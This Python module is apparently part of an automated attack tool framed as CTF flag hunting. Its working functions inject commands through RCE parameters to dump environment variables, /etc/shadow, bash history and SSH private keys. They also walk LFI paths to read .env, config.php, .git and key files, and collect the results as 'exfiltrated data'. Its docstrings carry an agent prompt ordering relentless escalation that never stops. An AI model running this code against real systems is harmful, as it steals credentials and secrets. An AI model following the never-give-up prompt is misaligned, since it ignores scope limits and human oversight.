"""
FLAG HUNTER - NEVER-GIVE-UP CTF Automation & Data Exfiltration Module
Aggressive flag hunting with multi-phase escalation and confidence classification.
System Prompt: "You are the Dengkis Exfiltration Module. NEVER GIVE UP. Exhaust ALL vectors."
"""
import re
import asyncio
import base64
import hashlib
from typing import Dict, List, Optional, Set, Tuple
import httpx

from engine.logging.logger import get_logger


# Flag confidence levels
CONFIRMED = "CONFIRMED"  # Format + exploit-backed validation
HIGH_PROBABILITY = "HIGH_PROBABILITY"  # Strong entropy + context
CANDIDATE = "CANDIDATE"  # Regex match only
NOISE = "NOISE"  # CSS, hashes, ETag, static assets


class FlagHunter:
    """
    NEVER-GIVE-UP exfiltration module with multi-phase escalation.
    System Prompt: "You are the Dengkis Exfiltration Module. Your goal is to maximize data retrieval.
    NEVER terminate early. Absence of flags triggers escalation, not exit."
    """
    
    def __init__(self, session: Optional[httpx.AsyncClient] = None):
        self.session = session
        self.logger = get_logger()
        self.flags_found: Dict[str, Dict] = {}  # flag -> {confidence, source, context, validation}
        self.exfiltrated_data: List[Dict] = []
        self.escalation_phase = 0
        self.vectors_exhausted = []
        
        # Extended flag patterns (CTF formats)
        self.flag_patterns = [
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'[A-Z0-9]{32}',  # MD5-like flags
            r'[A-Z0-9]{40}',  # SHA1-like flags
            r'[A-Z0-9]{64}',  # SHA256-like flags
            r'[a-f0-9]{32}',  # Lowercase hex (MD5)
            r'[a-f0-9]{40}',  # Lowercase hex (SHA1)
            r'[a-f0-9]{64}',  # Lowercase hex (SHA256)
            r'[A-Za-z0-9+/]{43}=',  # Base64-like
            r'[A-Za-z0-9_-]{20,}',  # Long alphanumeric strings
            r'picoCTF\{[^}]+\}',  # picoCTF format
            r'HTB\{[^}]+\}',  # HackTheBox format
            r'THM\{[^}]+\}',  # TryHackMe format
        ]
    
    def _classify_flag_confidence(self, flag: str, source: str, context: Dict) -> Tuple[str, str]:
        """
        Classify flag confidence based on format, context, and validation.
        
        Returns:
            Tuple of (confidence_level, reason)
        """
        # Check for known CTF formats (highest confidence)
        ctf_formats = [
            r'FLAG\{[^}]+\}', r'CTF\{[^}]+\}', r'flag\{[^}]+\}', r'ctf\{[^}]+\}',
            r'picoCTF\{[^}]+\}', r'HTB\{[^}]+\}', r'THM\{[^}]+\}'
        ]
        
        for pattern in ctf_formats:
            if re.match(pattern, flag, re.IGNORECASE):
                # Format matches - check context
                if context.get('exploitation_backed', False):
                    return CONFIRMED, "CTF format + exploitation-backed validation"
                elif context.get('source') in ['rce', 'lfi', 'sqli', 'ssti']:
                    return HIGH_PROBABILITY, f"CTF format + found via {context.get('source')}"
                else:
                    return CANDIDATE, "CTF format match (needs validation)"
        
        # Check entropy and length (hash-like flags)
        if len(flag) in [32, 40, 64] and re.match(r'^[A-Fa-f0-9]+$', flag):
            if context.get('exploitation_backed', False):
                return HIGH_PROBABILITY, "Hash-like format + exploitation-backed"
            elif context.get('source') in ['env', 'config', 'secret_file']:
                return HIGH_PROBABILITY, f"Hash-like format + found in {context.get('source')}"
            elif context.get('source') in ['header', 'css', 'static']:
                return NOISE, "Hash-like but in static content (likely ETag/hash)"
            else:
                return CANDIDATE, "Hash-like format (needs context validation)"
        
        # Base64-like patterns
        if re.match(r'^[A-Za-z0-9+/]{20,}={0,2}$', flag):
            if context.get('exploitation_backed', False):
                return HIGH_PROBABILITY, "Base64-like + exploitation-backed"
            else:
                return CANDIDATE, "Base64-like pattern (needs decoding validation)"
        
        # Long alphanumeric strings
        if len(flag) >= 20 and re.match(r'^[A-Za-z0-9_-]+$', flag):
            if context.get('source') in ['rce', 'lfi', 'sqli']:
                return HIGH_PROBABILITY, f"Long alphanumeric + found via {context.get('source')}"
            elif context.get('source') in ['header', 'css']:
                return NOISE, "Long alphanumeric in static content"
            else:
                return CANDIDATE, "Long alphanumeric string (needs validation)"
        
        # Default: candidate
        return CANDIDATE, "Pattern match only (needs validation)"
    
    async def hunt_flags(self, response_text: str, endpoint: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Scan response body for flag patterns with confidence classification.
        
        Args:
            response_text: Response body to scan
            endpoint: Endpoint where response came from
            context: Context dict with source, exploitation_backed, etc.
            
        Returns:
            List of flag dicts with confidence classification
        """
        if context is None:
            context = {'source': 'static_content', 'exploitation_backed': False}
        
        flags_found = []
        
        for pattern in self.flag_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                # Skip if already classified
                if match in self.flags_found:
                    continue
                
                # Classify confidence
                confidence, reason = self._classify_flag_confidence(match, endpoint, context)
                
                # Store flag with metadata
                flag_data = {
                    'flag': match,
                    'confidence': confidence,
                    'reason': reason,
                    'endpoint': endpoint,
                    'source': context.get('source', 'unknown'),
                    'exploitation_backed': context.get('exploitation_backed', False),
                    'pattern': pattern,
                    'context': context
                }
                
                self.flags_found[match] = flag_data
                flags_found.append(flag_data)
                
                # Log based on confidence
                if confidence == CONFIRMED:
                    self.logger.warning(f"[FLAG HUNTER] CONFIRMED FLAG: {match} at {endpoint} ({reason})")
                elif confidence == HIGH_PROBABILITY:
                    self.logger.warning(f"[FLAG HUNTER] HIGH-PROBABILITY FLAG: {match} at {endpoint} ({reason})")
                elif confidence == CANDIDATE:
                    self.logger.info(f"[FLAG HUNTER] CANDIDATE FLAG: {match} at {endpoint} ({reason})")
                else:
                    self.logger.debug(f"[FLAG HUNTER] NOISE (filtered): {match} at {endpoint}")
        
        if flags_found:
            self.exfiltrated_data.append({
                'type': 'flag',
                'endpoint': endpoint,
                'flags': flags_found,
                'context': context
            })
        
        return flags_found
    
    async def execute_rce_commands(self, endpoint: str, parameter: str, rce_payload: str) -> Dict:
        """
        Execute RCE commands to dump environment and filesystem.
        System Prompt: "If RCE is achieved, immediately execute env, ls -R /home, and cat /proc/self/environ"
        
        Args:
            endpoint: Vulnerable endpoint
            parameter: Parameter that accepts RCE
            rce_payload: Base RCE payload pattern
            
        Returns:
            Dictionary with exfiltrated data
        """
        exfil_data = {
            'endpoint': endpoint,
            'parameter': parameter,
            'type': 'rce_exfiltration',
            'commands_executed': [],
            'data': {}
        }
        
        # Commands to execute
        commands = [
            ('env', 'Environment variables'),
            ('cat /proc/self/environ', 'Process environment'),
            ('ls -la /home', 'Home directory listing'),
            ('cat /etc/passwd', 'User accounts'),
            ('cat /etc/shadow', 'Password hashes'),
            ('cat ~/.bash_history', 'Command history'),
            ('cat ~/.ssh/id_rsa', 'SSH private key'),
            ('cat ~/.ssh/id_rsa.pub', 'SSH public key'),
        ]
        
        for cmd, description in commands:
            try:
                # Construct RCE payload
                if ';' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload}; {cmd}"
                elif '|' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} | {cmd}"
                elif '`' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} `{cmd}`"
                else:
                    payload = f"{rce_payload} {cmd}" if rce_payload else cmd
                
                # Execute command
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.get(
                            endpoint,
                            params={parameter: payload} if '?' in endpoint else None,
                            data={parameter: payload} if '?' not in endpoint else None
                        )
                else:
                    if '?' in endpoint:
                        response = await self.session.get(endpoint, params={parameter: payload})
                    else:
                        response = await self.session.post(endpoint, data={parameter: payload})
                
                if response.status_code == 200:
                    exfil_data['commands_executed'].append(cmd)
                    exfil_data['data'][cmd] = response.text[:5000]  # Limit size
                    
                    # Hunt for flags in response with RCE context (HIGH confidence)
                    flags = await self.hunt_flags(
                        response.text, 
                        endpoint,
                        context={'source': 'rce', 'exploitation_backed': True, 'command': cmd}
                    )
                    if flags:
                        exfil_data['flags_found'] = flags
                        # Log confirmed flags immediately
                        confirmed = [f for f in flags if f.get('confidence') == CONFIRMED]
                        if confirmed:
                            self.logger.warning(f"[FLAG HUNTER] CONFIRMED FLAG via RCE: {confirmed[0]['flag']}")
                    
                    self.logger.info(f"[FLAG HUNTER] Executed: {cmd} on {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"[FLAG HUNTER] Failed to execute {cmd}: {e}")
        
        if exfil_data['commands_executed']:
            self.exfiltrated_data.append(exfil_data)
        
        return exfil_data
    
    async def lfi_config_crawl(self, endpoint: str, parameter: str, lfi_payload: str) -> Dict:
        """
        Systematically attempt to read common sensitive paths via LFI.
        System Prompt: "If LFI is confirmed, systematically attempt to read common sensitive paths"
        
        Args:
            endpoint: Vulnerable endpoint
            parameter: Parameter that accepts LFI
            lfi_payload: Base LFI payload pattern
            
        Returns:
            Dictionary with exfiltrated file contents
        """
        exfil_data = {
            'endpoint': endpoint,
            'parameter': parameter,
            'type': 'lfi_exfiltration',
            'files_read': [],
            'data': {}
        }
        
        # Common sensitive paths
        sensitive_paths = [
            '../../../../etc/passwd',
            '../../../../etc/shadow',
            '../../../../etc/hosts',
            '../../../../var/www/html/.env',
            '../../../../var/www/html/config.php',
            '../../../../var/www/html/config.inc.php',
            '../../../../.env',
            '../../../../.git/config',
            '../../../../.git/HEAD',
            '../../../../.ssh/id_rsa',
            '../../../../.ssh/known_hosts',
            '~/.bash_history',
            '~/.bashrc',
            '~/.profile',
            '/proc/self/environ',
            '/proc/version',
            '/etc/issue',
            '/etc/motd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
        ]
        
        for path in sensitive_paths:
            try:
                # Construct LFI payload
                if '../../' in lfi_payload:
                    payload = lfi_payload.replace('../../../../etc/passwd', path)
                else:
                    payload = path
                
                # Attempt to read file
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.get(
                            endpoint,
                            params={parameter: payload} if '?' in endpoint else None
                        )
                else:
                    response = await self.session.get(endpoint, params={parameter: payload})
                
                # Check if file was read (not a 404 or error page)
                if response.status_code == 200:
                    # Check for file indicators
                    content = response.text
                    if any(indicator in content for indicator in ['root:', '[boot loader]', 'DB_PASSWORD', 'SECRET_KEY']):
                        exfil_data['files_read'].append(path)
                        exfil_data['data'][path] = content[:5000]  # Limit size
                        
                        # Hunt for flags with LFI context (HIGH confidence)
                        flags = await self.hunt_flags(
                            content,
                            endpoint,
                            context={'source': 'lfi', 'exploitation_backed': True, 'file': path}
                        )
                        if flags:
                            exfil_data['flags_found'] = flags
                            # Log confirmed flags immediately
                            confirmed = [f for f in flags if f.get('confidence') == CONFIRMED]
                            if confirmed:
                                self.logger.warning(f"[FLAG HUNTER] CONFIRMED FLAG via LFI: {confirmed[0]['flag']}")
                        
                        self.logger.warning(f"[FLAG HUNTER] Successfully read: {path} from {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"[FLAG HUNTER] Failed to read {path}: {e}")
        
        if exfil_data['files_read']:
            self.exfiltrated_data.append(exfil_data)
        
        return exfil_data
    
    def get_exfiltrated_data(self) -> List[Dict]:
        """Get all exfiltrated data."""
        return self.exfiltrated_data
    
    def get_flags_found(self) -> List[str]:
        """Get all flags found (raw strings)."""
        return list(self.flags_found.keys())
    
    def get_confirmed_flags(self) -> List[Dict]:
        """Get only CONFIRMED flags."""
        return [flag_data for flag_data in self.flags_found.values() 
                if flag_data.get('confidence') == CONFIRMED]
    
    def get_high_probability_flags(self) -> List[Dict]:
        """Get HIGH_PROBABILITY flags."""
        return [flag_data for flag_data in self.flags_found.values() 
                if flag_data.get('confidence') == HIGH_PROBABILITY]
    
    def get_candidate_flags(self) -> List[Dict]:
        """Get CANDIDATE flags (need validation)."""
        return [flag_data for flag_data in self.flags_found.values() 
                if flag_data.get('confidence') == CANDIDATE]
    
    def has_confirmed_flag(self) -> bool:
        """Check if any CONFIRMED flag exists."""
        return len(self.get_confirmed_flags()) > 0
    
    def get_escalation_summary(self) -> Dict:
        """Get summary of escalation attempts and results."""
        return {
            'confirmed_flags': len(self.get_confirmed_flags()),
            'high_probability_flags': len(self.get_high_probability_flags()),
            'candidate_flags': len(self.get_candidate_flags()),
            'total_flags': len(self.flags_found),
            'vectors_exhausted': self.vectors_exhausted,
            'escalation_phase': self.escalation_phase,
            'all_flags': list(self.flags_found.values())
        }
